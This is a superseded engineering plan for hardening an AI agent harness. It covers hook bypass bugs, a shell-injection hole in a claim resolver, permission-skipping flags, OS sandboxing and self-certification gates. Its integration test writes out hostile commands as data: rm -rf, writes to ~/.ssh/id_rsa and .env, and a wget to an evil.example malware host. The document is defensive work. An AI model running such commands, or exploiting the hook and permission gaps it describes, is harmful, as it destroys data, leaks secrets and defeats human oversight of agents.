# Implementation Plan — Agentvibe Harness

> ## ⚠️ SUPERSEDED — do not follow this numbering
>
> **Superseded 2026-08-16 by [AGENT-SYSTEM-REBUILD.md](AGENT-SYSTEM-REBUILD.md)** (founder decision).
> Two live plans numbering the same work differently is two statements of one fact with nothing checking
> them against each other — the defect class this repo spent Phase 8a cataloguing. The rebuild plan wins:
> it is ADR-backed and carries phase-by-phase evidence.
>
> Kept for its reasoning, not its sequence. Its Wave/Phase numbers do **not** map onto the rebuild plan's
> Phases 1–9. Its Phase 5 (Mission Control 8a) is done; most of its Phase 0 landed in #42 and #44.

**Author:** framer · **Date:** 2026-08-14 · **State of repo:** ~~Phase 8a, PR3/5 merged, `main` = `0a23471`~~ — stale; `main` = `08e7981` and 8a is complete

---

## 1 · What this builds toward

The finished system lets a solo founder dispatch any venture task — code, pricing, research, positioning,
copy — with a single command and then watch it run from a terminal or from Mission Control. Agents fan out,
verify their own claims, hand off across engine boundaries, and stop at approval gates before irreversible
actions. The work product lands in a claim-verified artifact, not in chat history. The most important
sequencing decision in this plan is simple and non-negotiable: **Wave A (Phase 0, the safety floor) ships as
one atomic block before any other phase begins.** Every subsequent phase makes the system more capable. A
more capable broken system does more harm per autonomous hour than the less capable broken one it replaces.
The three confirmed RCEs and the hook bypass that makes every block decorative are not planning items — they
are blockers. Nothing ships until Phase 0 exits.

---

## 2 · Shape of the finished system

| Surface | What it is |
|---|---|
| **Engines** | 6 active (orchestrator, framer, sourcer, builder, designer, reviewer) + 11 shims retiring at Phase 9 |
| **Containment** | macOS Seatbelt / Linux bubblewrap as the real boundary; `pre-tool-use.sh` demoted to semantic policy |
| **Budget guard** | `budget-guard.js` registered in `settings.json`, ceiling in **dollars** (not output tokens), rolling 5-hour window |
| **Usage tracking** | `turnsFrom()` records model, cwd, sessionId, and all three token types (output + cache-read + cache-write); cost computed in dollars from the model price table |
| **Claim ledger** | `enforcement: block` on every claim whose failure must stop work; `cmdVerify` reads `required_claim_kinds`; `resolvers.js:261` RCE closed |
| **Lens delivery** | Lenses compiled **into agent `.md` bodies at generation time** — no 25 KB runtime dump; `session-start.js` becomes a ~1.5 KB router |
| **Skills** | 16 boilerplate stubs deleted; skills load on demand, not unconditionally |
| **QA gate** | Author-write protection: PASS must come from a session file the claiming agent did not write |
| **Mission Control** | All 7 views live: Fleet, Sessions, Belief, Conflicts, Project, Inbox, Dispatch |
| **Fleet** | 12 launchers on 1 generation (after Phase 9) |
| **Venture work** | Z1 complete: one real venture task with pre-registered predictions verified |

---

## 3 · What we are deleting

Subtraction is the biggest win. Each item below adds complexity or cost while protecting nothing.

| What | Where | Why it goes |
|---|---|---|
| `--dangerously-skip-permissions` flag | `bin/warroom:235,237` (two `claude` invocations) | Makes all `settings.json` deny rules inert. Any `--allowedTools` list on the command is the real policy |
| Unconditional 25 KB lens/playbook dump | `.claude/hooks/session-start.js:162–199` | Costs 25,613 bytes every session start; replaced by compiled lens bodies in agent files + a router hook |
| 16 boilerplate skill stubs | `.claude/skills/**` (byte-identical bodies) | Inject 30,866 chars/session unconditionally; zero unique content |
| Output-only `turnsFrom()` | `scripts/lib/usage.js:65–78` | Records 11.3% of the actual dollar bill; cache reads (55.7%) and cache writes (32.8%) are invisible to it |
| `warn()` on BLOCKS-hook registration | `scripts/check-registration.mjs:290` | A BLOCKS hook that fires on a missing registration but exits 0 is no registration check |
| Shim rule that blocks `tools:` declaration | `.claude/hooks/schema-lint.js:252–255` | Prevents `reviewer` from being correctly declared read-only, which is the entire point of it being a shim |

---

## 4 · The plan

Phases are ordered by what blocks what. Gate is the measurable exit condition; "Unblocks" is what cannot
start until the gate closes.

### Wave A — Safety floor (non-negotiable; must ship as a single PR)

---

#### Phase 0 — Close the three open vulnerabilities and fix the hook

**Goal:** Every stated blocking rule actually blocks. The budget guard fires. The session that runs Phase 1
is safer than the one that ran Phase 8a.

**Reversibility:** Irreversible in the sense that the trust model changes. Rolling back means re-opening
the holes. Recommend against.

| Step | File / line | Change | Tier | Effort |
|---|---|---|---|---|
| 0-A | `scripts/lib/resolvers.js:261` | Replace `execFileSync('/bin/sh', ['-c', ev.cmd])` with `execFileSync(binary, args_array)` where `binary` and `args_array` are derived by splitting `ev.cmd` and validating the first token against an allowlist of exactly the commands the resolver is expected to run (`node`, `sh` with a fixed script path). Add an integration test. | full | 3h |
| 0-B | `.claude/hooks/pre-tool-use.sh:54` | Replace `awk -F'"' '/"tool_name"/{print $4; exit}'` with `python3 -c "import json,sys; print(json.loads(sys.stdin.read())['tool_name'])"` using the same python3 already invoked at line 60. The awk expression returns the value at field 4 of the first line matching `"tool_name"` — on compact JSON where `session_id` precedes `tool_name`, field 4 is the session-id value, not the tool name. The case statement then falls through to `*)` and allows everything. Verify by piping compact JSON payloads for `rm -rf /`, `Write ~/.ssh/id_rsa`, and `cat .env` and asserting non-zero exit. | full | 2h |
| 0-C | `.claude/settings.json` | Add `budget-guard.js` to `PreToolUse` hooks. The file exists at `.claude/hooks/budget-guard.js` but is not registered — `settings.json` lists `pre-tool-use.sh` and `gsa-context-monitor.js`, never `budget-guard.js`. | lite | 30min |
| 0-D | `bin/warroom:235,237` | Remove `--dangerously-skip-permissions` from both `claude` invocations. Add explicit `--allowedTools` per-engine invocation. Audit every `claude` call in the file first. This is the highest-blast-radius change in Phase 0 — without it, all `settings.json` deny rules are inert regardless of what they say. | irreversible | 4h |
| 0-E | `.claude/hooks/schema-lint.js:252–255` | Remove the shim rule that actively prevents `tools:` declaration. The rule was added to keep shim bodies minimal; it now prevents `reviewer` from declaring its read-only tool set, which is the primary reason `reviewer` should be a real engine definition rather than a shim. After removing, add `tools: [Read, Glob, Grep, Task]` to `.claude/agents/reviewer.md`. | lite | 1h |
| 0-F | `scripts/check-registration.mjs:290` | Change `warn('unregistered', ...)` to `fail('unregistered', ...)` — a BLOCKS-class hook that is missing from all hooks, workflows, and npm scripts should fail `npm run check`, not warn it. It did not do so because the check itself used the weaker function. | lite | 30min |
| 0-G | (new) `scripts/test/hook-gate.sh` | Integration test: pipe 8 compact-JSON payloads through `pre-tool-use.sh` directly and assert non-zero exit for each: `rm -rf /`, `rm -rf ~`, `chmod +x`, `cat .env`, `Write ~/.ssh/id_rsa`, `git push --force origin main`, `wget http://evil.example`, `curl https://external.example`. A test that cannot fail is not a test; verify each payload actually enters the correct branch by checking stderr contains `BLOCKED`. | full | 2h |

**Gate:** `npm run check` exits 0 with `budget-guard.js` registered. The 8-payload integration test passes. Piping `{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}` (compact, single-line) to `pre-tool-use.sh` exits non-zero and emits `BLOCKED`. `git diff --name-only main` includes `resolvers.js` with no `/bin/sh`+`-c` pattern.

**What it unblocks:** Every phase from Phase 1 onward. Nothing should run on the current broken system after today's date except Phase 0 itself.

---

### Wave B — Enforcement and signal quality

---

#### Phase 1 — Promote enforcement from shadow to block

**Goal:** The claim ledger's `enforcement: block` actually blocks. `cmdVerify` reads `required_claim_kinds`. The QA gate cannot be self-certified.

**Reversibility:** Reversible (one flag per claim, one line in `qa-lead-pass.yml`). Recommend shipping all three together so the promotion is a single auditable PR.

| Step | File / line | Change | Tier | Effort |
|---|---|---|---|---|
| 1-A | `.claude/ledger/index.json` and all source claims | For every claim with `enforcement: shadow` whose `verified_by: command` has already fired correctly in Phases 1–8a, promote to `enforcement: block`. Claims whose commands have never fired, or fired and were found to be testing their own excuse (the nine-times defect class in PHASE-8A-HANDOFF §0), stay `shadow` or move to `unresolved`. | full | 4h |
| 1-B | `scripts/lib/ledger.mjs` — `cmdVerify` | `required_claim_kinds` is computed by `classifier.js` but `cmdVerify` never reads it. The field is decorative. Make `cmdVerify` read it and fail any artifact that is missing a required claim kind for its tier. Add a test: a lite-tier artifact with no `behavior` claim fails verification. | full | 3h |
| 1-C | `.github/workflows/qa-lead-pass.yml` | The workflow greps `qa_verdict:\s+PASS` from the session file. The session file is written by the agent requesting the pass. Self-certification is the failure mode this gate exists to prevent. Fix: require the PASS line to appear in a session file with a different `agent:` field than the one that opened the PR, or require it in a human review comment. | full | 3h |

**Gate:** `node scripts/ledger.mjs verify` exits non-zero when a block-enforced claim has an expired or failed resolver. `qa-lead-pass.yml` rejects a PR where the only PASS is from the author's own session file (add a fixture test).

**What it unblocks:** Phase 2 (subtraction is safe once the gates are real). Venture run Z1 (the system can be trusted to report its own failures).

---

#### Phase 2 — Fix usage tracking and the budget ceiling

**Goal:** `budget-guard.js` measures dollars, not output tokens. `turnsFrom()` sees all three token types plus model plus cost. The ceiling is meaningful.

**Reversibility:** Reversible. The existing output-token ceiling stays as a secondary signal during transition.

| Step | File / line | Change | Tier | Effort |
|---|---|---|---|---|
| 2-A | `scripts/lib/usage.js:65–78` — `turnsFrom()` | Add `cache_read: u.cache_read_input_tokens \|\| 0` and `cache_write: u.cache_creation_input_tokens \|\| 0` to the returned object. Add `model: o.message && o.message.model` and `sessionId: o.sessionId`. Cost in dollars = `(out * OUTPUT_PRICE[model] + cache_read * CACHE_READ_PRICE[model] + cache_write * CACHE_WRITE_PRICE[model]) / 1_000_000`. | lite | 2h |
| 2-B | `.claude/hooks/budget-guard.js` | Replace the output-token ceiling with a dollar ceiling. `warn_usd` defaults to 15 (current session measured at ~$3/h, warn at ~5h equivalent); `block_usd` defaults to 25. Keep the stall detector (tokens since last artifact) as a secondary signal — it is measuring the right thing and does not need to change. Add `AGENTVIBE_BUDGET_USD_WARN` and `AGENTVIBE_BUDGET_USD_BLOCK` env overrides. | lite | 2h |
| 2-C | `scripts/lib/usage.js` comments | Correct the false claim at lines 5–8 that "0 of 414M tokens passed through Task." That measurement was of one session; the summary data shows subagent turns are 65.2% of the measured $20,957 fleet bill. The comment shapes how readers size the stall detector. | trivial | 30min |

**Gate:** `node scripts/lib/usage.js --selftest` (new flag) prints cost in dollars to 4 decimal places for a constructed transcript. The figure matches hand-computed `(out * 15 + cr * 0.30 + cw * 3.75) / 1_000_000` for Sonnet 4.6. `budget-guard.js` registered (Phase 0-C) and dollar threshold confirmed in settings comment.

**What it unblocks:** Unattended runs (the run cannot be authorized until the spend ceiling is honest).

---

### Wave C — Subtraction and signal reduction

---

#### Phase 3 — Delete the boilerplate; compile lenses into agent bodies

**Goal:** Session start costs ~1.5 KB of router, not 25,613 bytes of dump. Skills load on demand. The 16 byte-identical boilerplate stubs are gone.

**Reversibility:** Reversible. Lenses still exist in `lenses.yml`; the compilation is additive to agent bodies. Skills can be restored from git. Agent bodies are generated, so regeneration is always possible.

| Step | File / line | Change | Tier | Effort |
|---|---|---|---|---|
| 3-A | `.claude/skills/**` | Delete the 16 boilerplate stubs whose bodies are byte-identical (identified by hash). Before deleting, check `~/.claude/skills/` for globals shadowed by these names (the seven-collision bug documented in `check-registration.mjs:294–314` applies here too). If a global exists, the deletion un-shadows it — verify the global's content is the one you want, or delete both. | full | 3h |
| 3-B | `.claude/hooks/session-start.js:162–199` | Replace the full-dump block with a router. The router: (1) emits the current-session ledger status (≤ 500 bytes); (2) emits the active playbook name only, not its full YAML; (3) tells the engine where to read lenses and playbooks if needed. No lens YAML, no playbook YAML, no full skill bodies at session start. | full | 4h |
| 3-C | `scripts/generate-agent-bodies.mjs` (new) | Write a generator that reads `lenses.yml` and `review-lenses.yml` and writes each engine's `procedure` and `refuses` into a `<!-- GENERATED-LENS -->` block inside its `.claude/agents/<engine>.md`. This is the "compile, don't inject" pattern: the data is there when the agent starts, not pushed at runtime. Generator runs in CI and `npm run check`; a dirty block fails the build. | full | 6h |
| 3-D | `.claude/hooks/session-start.test.mjs` | Add an assertion: a mock session receives ≤ 2,000 bytes. The current test asserts only on stdout, not on what the session receives — it cannot catch the 25 KB regression returning. | lite | 2h |

**Gate:** `session-start.js` output measured at ≤ 2,000 bytes on a mock payload. `scripts/generate-agent-bodies.mjs --verify` exits 0 on a clean repo and non-zero with a deliberate lens mutation. Skill count in `.claude/skills/` drops by 16 and `npm run check` still passes.

**What it unblocks:** Phase 4 (OS sandbox). The sandbox's complexity budget goes further when the session context is 12x smaller.

---

### Wave D — Containment

---

#### Phase 4 — OS-level sandbox

**Goal:** The real containment boundary is the operating system, not the hook. The hook becomes semantic policy. An agent cannot escape containment by exploiting the awk bug or by running through `--dangerously-skip-permissions` (which Phase 0 removed, but future invocations should be hardened by the OS layer regardless).

**Reversibility:** Hard to reverse once the sandbox profile is tuned and the launch wrapper is in place. Recommend gating on a complain-mode run first (macOS `sandbox-exec -n deny` traces denials without blocking them).

| Step | File / line | Change | Tier | Effort |
|---|---|---|---|---|
| 4-A | `.claude/sandbox/agentvibe.sb` (new, macOS) / `.claude/sandbox/agentvibe.bwrap` (new, Linux) | Write a macOS Seatbelt profile (`sandbox-exec -f`) and a Linux bubblewrap invocation. Minimal deny-default, then allow: the repo directory, `~/.claude/`, `~/.agentvibe/`, `/tmp`, the Node.js binary, git. Deny: `/etc/passwd`, `/etc/shadow`, `~/.ssh/`, all network except localhost and GitHub API. | full | 8h |
| 4-B | `bin/warroom` — `claude` invocations | Wrap `claude` with `sandbox-exec -f .claude/sandbox/agentvibe.sb -- claude ...` on macOS, `bwrap ... claude` on Linux. The sandbox profile is the enforcement; the hook is the policy layer on top. | irreversible | 3h |
| 4-C | `.claude/sandbox/README.md` | Document what the profile allows, what it denies, and how to add a new allowed path — because the next developer who needs network access will add it, and the profile must survive that without becoming a deny-default profile with a wildcard allow. | trivial | 1h |

**Gate:** In complain mode: `sandbox-exec -n default/deny` traces show the claude binary makes no calls outside the allowlist. In block mode: a test script attempting to read `~/.ssh/id_rsa` from inside the sandbox exits non-zero. The hook integration test (Phase 0-G) still passes with the sandbox wrapper in place.

**What it unblocks:** Unattended runs at higher risk levels. The OS sandbox is what separates "supervised autonomous" from "unattended autonomous."

---

### Wave E — Signal and completeness

---

#### Phase 5 — Mission Control Phase 8a completion (PR4 + PR5)

**Goal:** All six read-plane views live. The builder for PR4 and PR5 inherits the PHASE-8A-HANDOFF §0 lessons: every guard has an independent barrier that catches the guard being wrong.

**Reversibility:** Reversible. Views are additive; nothing outside `mission-control/` imports them.

| Step | File / line | Change | Tier | Effort |
|---|---|---|---|---|
| 5-A | `mission-control/client/src/views/BeliefView.tsx` (new) + `mission-control/server/routes/api.ts` (belief route) | Belief view: list active claims by status (verified / unresolved / expired / failed), grouped by enforcement level. Source: `node scripts/ledger.mjs list --json`. Cross-check test: mutate a fixture claim to `failed`; view shows it red; `ledger.mjs list` output agrees. | lite | 4h |
| 5-B | `mission-control/client/src/views/ConflictsView.tsx` (new) | Conflicts view: claims with `enforcement: block` whose resolver has not fired in the last `valid_until` window. Same cross-check pattern. | lite | 3h |
| 5-C | `mission-control/client/src/views/ProjectView.tsx` + `InboxView.tsx` (honest empty states) | Each empty state names the specific emitter that is missing: ProjectView names `ledger.mjs sweep --project` (not yet a subcommand); InboxView names the outbound queue (Phase 8b). Neither says "coming soon." | lite | 2h |

**Gate:** `npm run check` exits 0 including `check:mc`. Every figure in Belief and Conflicts views is reproducible by the independent command listed in the cross-check comment. Mutating a fixture turns a test red. Cold start ≤ 10 s measured against the real corpus (2,029 files / 2.83 GB), per the raised budget in DECISIONS.md 2026-08-13.

**What it unblocks:** Z1 venture run — the Belief view is the dashboard that lets Adam watch the run's claim state without opening a terminal pane.

---

### Wave F — The venture run

---

#### Phase 6 — Z1: one real venture task

**Goal:** The harness completes one task that it did not author. Stop condition 6 — "nothing built has met a task it did not author" — closes. `autonomous` tier remains ungrantable until this exits.

**Reversibility:** Irreversible in the sense that the system's track record changes. The claim asserting Z1 is complete cannot be un-completed. The task output is a real artifact in a real project.

**The venture run happens BEFORE everything is perfect and AFTER Wave A.**
This is the critic's correction that most surprised the layer designers: waiting for the perfect system before running means running a system nobody has ever measured against real work. The pre-registered predictions are the point — they create a falsifiable test of what the current system actually does vs. what the docs say it does. Running on a partially fixed system is more honest than running on a system that has never run.

| Step | File | Change | Tier | Effort |
|---|---|---|---|---|
| 6-A | `docs/03-system-design/Z1-PREDICTIONS.md` (new) | Before running, write down exactly what you predict the system will do: which engine will be dispatched, what claims it will emit, where it will get stuck, whether it will produce a verified artifact. This file is written BEFORE the run. It is not amended during the run. | none | 1h |
| 6-B | Task selection | Pick a task with a verifiable artifact: a pricing spec, a market-size calculation, a landing page copy brief. Not code (code has CI; the interesting thing is whether the framing, sourcing, and claim verification work without CI). The task should require at least framer + sourcer + one claim with a `verified_by: command` resolver. | none | 30min |
| 6-C | Run + observe | Dispatch from orchestrator with the task. Watch in Mission Control Belief view. Do not intervene unless an unrecoverable action is about to fire. Record what actually happened, where it diverged from Z1-PREDICTIONS.md. | none | half day |
| 6-D | `docs/03-system-design/Z1-DEBRIEF.md` (new) | Write the delta between predictions and actuals. Every divergence is either a bug to fix or a belief to update. If the system produced a verified artifact, the claim `c-venture-task-complete` is emitted with `enforcement: block` — nothing that depends on Z1 can proceed until this claim verifies. | none | 2h |

**Gate:** `c-venture-task-complete` claim exists in `docs/03-system-design/Z1-DEBRIEF.md`, is compiled into the ledger, verifies with `enforcement: block`, and is not authored by the same agent that ran the task.

**What it unblocks:** Phase 7 (fleet rollout). You do not propagate a system to 12 projects until you have seen it complete a task it did not author.

---

### Wave G — Propagation

---

#### Phase 7 — Fleet rollout (Phase 9)

**Goal:** 12 launchers on 1 generation. Mission Control 8b (Dispatch) live.

**Reversibility:** Hard to reverse. Every project's daily-driver launcher changes. The rollback mechanism (backups + `warroom --rollback`) must exist BEFORE the first rollout.

| Step | File | Change | Tier | Effort |
|---|---|---|---|---|
| 7-A | Rollback mechanism | Confirm `bin/warroom --rollback` restores from SHA256-verified backup. Test on `agentvibe` itself before any other project. | full | 2h |
| 7-B | `agentvibe` pilot install | Run `warroom --install` on `agentvibe`. Confirm semantic equivalence (the three-proof method from DECISIONS.md 2026-08-11 "Behaviour preservation is proven by three artefacts"). | full | 2h |
| 7-C | 11 remaining projects | Run `warroom --install` on each of the 11 in-scope projects. The check-only pass has been run monthly (stop condition 5b); the generation count should be flat. If it rose, stop and revisit. | irreversible | 4h |
| 7-D | Mission Control 8b — Dispatch view | The Dispatch view opens now that Phase 9 gives it targets running the current harness. Dispatch writes — it is the only view that does — so the command-injection lesson from PR2 applies with full force: `execFileSync(binary, args)`, never a string. | full | 6h |

**Gate:** `npm run warroom:fleet` reports all 12 in-scope launchers on generation 1. Mission Control Dispatch view completes a test dispatch to one project and the session appears in the Sessions view with real cost. Stop condition 5a closes.

**What it unblocks:** The system is complete. Every improvement now reaches 12 projects.

---

## 5 · Phase 0 in full detail

The builder needs no further design for Phase 0. Every change is specified to the line.

### Pre-work (before writing any code)

Run these three commands and record the output in a comment on the PR:

```bash
# 1. Confirm the awk bug fires on compact JSON
echo '{"session_id":"abc","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' \
  | .claude/hooks/pre-tool-use.sh
# Expected: exits non-zero, stderr contains BLOCKED
# Actual before fix: exits 0, stderr empty

# 2. Confirm budget-guard.js is not registered
node scripts/check-registration.mjs 2>&1 | grep budget-guard
# Expected: should appear in registration check
# Actual: not mentioned (it is not found as registered anywhere)

# 3. Confirm resolvers.js:261 pattern
grep -n '/bin/sh.*-c.*ev\.cmd' scripts/lib/resolvers.js
# Expected: line 261 matches
```

### Step 0-A — Fix `resolvers.js:261` RCE

**File:** `scripts/lib/resolvers.js`

**The defect:** Line 261 runs `execFileSync('/bin/sh', ['-c', ev.cmd])` where `ev.cmd` is the `evidence.cmd` string from a claim. Claims are authored by builders and framers — they can inject arbitrary shell. `/bin/sh -c <string>` is a shell injection vector.

**The fix:** The resolver's purpose is to run a known command and check its exit code. The set of legal commands is constrained: the command must be a shell invocation of a specific script under `scripts/` or a `node` invocation. Rewrite to:

```js
// Replace line 261's execFileSync with:
const parts = ev.cmd.trim().split(/\s+/);
const binary = parts[0];
const ALLOWED_BINARIES = ['node', 'bash', 'sh'];
if (!ALLOWED_BINARIES.includes(path.basename(binary))) {
  return result('claim-command', claim, 'unresolved',
    `evidence.cmd binary '${path.basename(binary)}' is not in the resolver allowlist`);
}
// For sh/bash, require the second arg to be a script path under scripts/ (no -c <string>)
if ((path.basename(binary) === 'sh' || path.basename(binary) === 'bash') &&
    parts[1] === '-c') {
  return result('claim-command', claim, 'unresolved',
    `evidence.cmd uses sh -c <string> which is a shell injection vector. ` +
    `Use sh scripts/your-script.sh instead.`);
}
stdout = execFileSync(binary, parts.slice(1), { cwd, timeout: ..., encoding: 'utf8', ... });
```

Add a unit test: a claim with `evidence.cmd: "sh -c 'echo pwned'"` must return `unresolved`, not `verified`.

**Tier:** full (changes security-critical path)

### Step 0-B — Fix `pre-tool-use.sh:54` parsing bug

**File:** `.claude/hooks/pre-tool-use.sh`

**The defect:** Line 54:
```bash
tool_name=$(printf '%s' "$payload" | awk -F'"' '/"tool_name"/{print $4; exit}')
```

Claude Code sends compact single-line JSON. The payload begins `{"session_id":"<uuid>","tool_name":"Bash",...}`. When `awk` splits on `"` and returns `$4`, it returns the session-id value (4th field), not the tool_name value. The case statement then sees `"<uuid>"` and falls to `*)` which allows the call unconditionally.

**The fix:** python3 is already called at line 60 for command extraction. Reuse it:
```bash
# Replace line 54 with:
tool_name=$(printf '%s' "$payload" | python3 -c \
  "import json,sys; print(json.loads(sys.stdin.read()).get('tool_name',''))" 2>/dev/null)
```

**Verify the fix** before committing by running the integration test script (Step 0-G). The test must fail on the current code and pass on the fix — document both states in the PR.

### Step 0-C — Register `budget-guard.js`

**File:** `.claude/settings.json`

Add to `PreToolUse.hooks`:
```json
{
  "type": "command",
  "command": "node .claude/hooks/budget-guard.js"
}
```

Place it **after** `pre-tool-use.sh` in the hooks array. `pre-tool-use.sh` is fast (bash, no I/O); `budget-guard.js` is slower (reads transcript files). Run the fast one first.

After editing, run `node scripts/check-registration.mjs` and confirm `budget-guard.js` appears as registered without warning.

### Step 0-D — Remove `--dangerously-skip-permissions`

**File:** `bin/warroom`

1. Search for all `claude` invocations in the file: `grep -n 'claude ' bin/warroom`
2. For each invocation, document what tools the launched engine legitimately needs.
3. Replace `--dangerously-skip-permissions` with `--allowedTools <comma-separated list>`.
4. The per-engine tool lists are in `.claude/agents/<engine>.md` `tools:` field. Use those as the source of truth.
5. Run `cmd_start` in a dev environment (tmux session) and verify at least one engine launches and completes a test dispatch before committing.

**This is the highest-blast-radius change in Phase 0.** If any existing workflow depends on a tool that is not in the allowlist, it will break silently (the agent will decline to use the tool, or the tool call will be denied). Do the audit first.

### Step 0-E — Fix schema-lint.js shim rule

**File:** `.claude/hooks/schema-lint.js:252–255`

The shim rule currently blocks any `tools:` declaration in a shim. Remove the rule. Then add to `.claude/agents/reviewer.md`:
```yaml
tools: [Read, Glob, Grep, Task]
```

Run `node .claude/hooks/schema-lint.js` and confirm it exits 0 with this change. The `reviewer` engine's read-only status is now declared in the file and enforced by the runtime, not just by a comment.

### Step 0-F — Upgrade warn to fail in check-registration.mjs

**File:** `scripts/check-registration.mjs:290`

Change:
```js
warn('unregistered', `${rel} is registered in no hook, no workflow, and no npm script`);
```
to:
```js
fail('unregistered', `${rel} is registered in no hook, no workflow, and no npm script`);
```

Run `npm run check` immediately after this change and confirm it still exits 0 (meaning `budget-guard.js` is now registered from Step 0-C, and `pre-tool-use.sh` and the other BLOCKS hooks are registered). If it exits non-zero, a hook you expected to be registered is not — fix it before committing.

### Step 0-G — Integration test

**New file:** `scripts/test/hook-gate.sh`

```bash
#!/usr/bin/env bash
# Integration test for pre-tool-use.sh. Must run AFTER 0-B.
# Usage: bash scripts/test/hook-gate.sh
set -e
HOOK=".claude/hooks/pre-tool-use.sh"
PASS=0
FAIL=0

check_block() {
  local label="$1"
  local payload="$2"
  if printf '%s' "$payload" | bash "$HOOK" >/dev/null 2>&1; then
    echo "FAIL (should have blocked): $label"
    FAIL=$((FAIL+1))
  else
    echo "PASS (correctly blocked): $label"
    PASS=$((PASS+1))
  fi
}

# Each payload is compact single-line JSON — the format Claude Code actually sends.
check_block "rm -rf /" \
  '{"session_id":"x","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'
check_block "rm -rf ~" \
  '{"session_id":"x","tool_name":"Bash","tool_input":{"command":"rm -rf ~"}}'
check_block "chmod +x" \
  '{"session_id":"x","tool_name":"Bash","tool_input":{"command":"chmod +x ./script.sh"}}'
check_block "Write .env" \
  '{"session_id":"x","tool_name":"Write","tool_input":{"file_path":".env","content":"SECRET=bad"}}'
check_block "Write .ssh/id_rsa" \
  '{"session_id":"x","tool_name":"Write","tool_input":{"file_path":"/Users/admin/.ssh/id_rsa","content":"fake"}}'
check_block "git push --force main" \
  '{"session_id":"x","tool_name":"Bash","tool_input":{"command":"git push --force origin main"}}'
check_block "wget external" \
  '{"session_id":"x","tool_name":"Bash","tool_input":{"command":"wget http://evil.example/malware"}}'
check_block "curl external" \
  '{"session_id":"x","tool_name":"Bash","tool_input":{"command":"curl https://external.example/data"}}'

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ] || exit 1
```

Add to `package.json` scripts: `"test:hook-gate": "bash scripts/test/hook-gate.sh"`.
Add to `.github/workflows/ci.yml` as a step in the `check` job, after `pre-tool-use.sh` is confirmed registered.

### Phase 0 PR checklist

Before opening the PR, confirm each item:

- [ ] `bash scripts/test/hook-gate.sh` — 8/8 PASS
- [ ] `node scripts/check-registration.mjs` — exits 0, no warnings
- [ ] `npm run check` — exits 0
- [ ] `grep -n '/bin/sh.*-c.*ev\.cmd' scripts/lib/resolvers.js` — returns nothing
- [ ] `grep -n 'dangerously-skip' bin/warroom` — returns nothing
- [ ] `node .claude/hooks/schema-lint.js` — exits 0 with reviewer's `tools:` field present
- [ ] A compact-JSON payload for `rm -rf /` piped to `pre-tool-use.sh` exits 2
- [ ] PR description documents the before/after for each of the 7 items

**Tier: irreversible** (because of 0-D; if any step in Phase 0 cannot be completed, the entire PR waits — do not merge a partial safety floor).

---

## 6 · Decisions only Adam can make

These are real either/or choices where the costs differ enough to matter. Max 6.

### D-1 — Dollar ceiling amount (Phase 2)

**Reversibility:** Reversible (one env var).

The measured peak is $20,957 total fleet bill (unspecified period). The per-session-hour cost is roughly $3. The rolling 5-hour window is the account's real constraint.

| Option | Warn at | Block at | Risk |
|---|---|---|---|
| **Conservative** | $12 / 5h window | $20 / 5h window | A heavy autonomous run (2–3 framer + sourcer cycles) may hit the warn level and interrupt work |
| **Permissive** | $30 / 5h window | $50 / 5h window | A stall or loop runs longer before stopping; the first time it fires is on a real bill |
| **Off for now** | — | — | The ceiling is registered but the threshold is effectively infinite; gives you data before choosing |

**Recommendation:** Conservative initially (warn at $12, block at $20), with the threshold in `.warroom.yml` so it can be changed without touching the codebase. **Adam's track record is to go against this recommendation** — noted in LONG-TERM.md.

### D-2 — Venture task for Z1 (Phase 6)

**Reversibility:** Irreversible (the run creates a real artifact and a real claim record).

| Option | What would have to be true to win |
|---|---|
| **Pricing spec for agentvibe itself** | The framer has the context; the sourcer has the market data; the artifact is a document with falsifiable claims. Lower blast radius. |
| **Market sizing for a real product decision** | Requires sourcer to pull real data (web search or existing files). Higher signal — this is what the system is for. |
| **Copy brief / landing page outline** | Requires framer + designer. Tests the design loop. |

**Recommendation:** Pricing spec for agentvibe (what should the harness cost if sold as a product). It exercises framer + sourcer + claim emission with real business numbers. It has a verifiable output (a document with cited evidence). It is reversible if the answer is "this is not the right task."

### D-3 — Sandbox scope (Phase 4)

**Reversibility:** Hard to reverse once the profile is tuned.

| Option | What it costs |
|---|---|
| **macOS Seatbelt only** | Works on your machine today; breaks on any Linux runner or CI; Phase 4-B needs an `#ifdef` |
| **macOS + Linux bubblewrap** | 2× the profile work; the two profiles diverge; you now maintain two containment implementations |
| **macOS Seatbelt now, bubblewrap deferred** | Phase 4 ships on your machine; CI gets no sandbox protection until bubblewrap lands; the gap is documented as a claim with `valid_until` |

**Recommendation:** macOS Seatbelt now, bubblewrap in a follow-on PR. The risk is CI; the mitigation is the hook (which is fixed in Phase 0) runs in CI without the sandbox and blocks the dangerous patterns there.

### D-4 — QA gate self-certification fix (Phase 1-C)

**Reversibility:** Reversible (one workflow line).

| Option | What it costs |
|---|---|
| **Require a second session file from a different agent** | Works today without humans; the reviewer engine writes a session file the orchestrator reads; adds one turn per PR |
| **Require a human comment on the PR** | Highest assurance; breaks the "no human in the loop" property for every merge; every automation run hits you for a review |
| **Require the PASS from a different branch session** | Architectural: the session that opened the PR cannot be the session that verifies it; implementation is tricky |

**Recommendation:** Require a second session file from a different agent (reviewer engine). The reviewer already exists; it writes a session file with a distinct `agent: reviewer` field; the workflow grep widens to also check that field differs from the PR-opening session's `agent:` field.

### D-5 — Skills deletion scope (Phase 3-A)

**Reversibility:** Reversible (git history).

The 16 boilerplate stubs are byte-identical (bodies). But "byte-identical body" may mean "this skill genuinely has no unique procedure," which is a reason to delete, or it may mean "the procedure was never written," which is a reason to write it or accept the deletion.

| Option | What it costs |
|---|---|
| **Delete all 16** | Skills that were never written are simply gone; anyone reaching for them gets a not-found error instead of a stub |
| **Delete 16, write 3 that have real procedure** | Requires identifying which 3 have genuine procedure worth capturing; adds work but leaves the system better |
| **Keep them with a warning comment** | Keeps the 30,866-char injection problem alive; does not solve the cost |

**Recommendation:** Delete all 16. The stubs were never used (zero dispatch evidence in the session corpus). A missing skill that fails loudly is better than a present skill that fabricates procedure.

### D-6 — Fleet rollout timing (Phase 7)

**Reversibility:** The rollout is hard to reverse across 12 projects at once. The per-project rollback exists, but rolling back 12 projects is a full day of work.

The 2026-08-11 decision deferred rollout to after all 8 phases. The rationale was "propagate one finished system once." Z1 (Phase 6) closes the most important open question: does the system actually work on a real task.

| Option | What it costs |
|---|---|
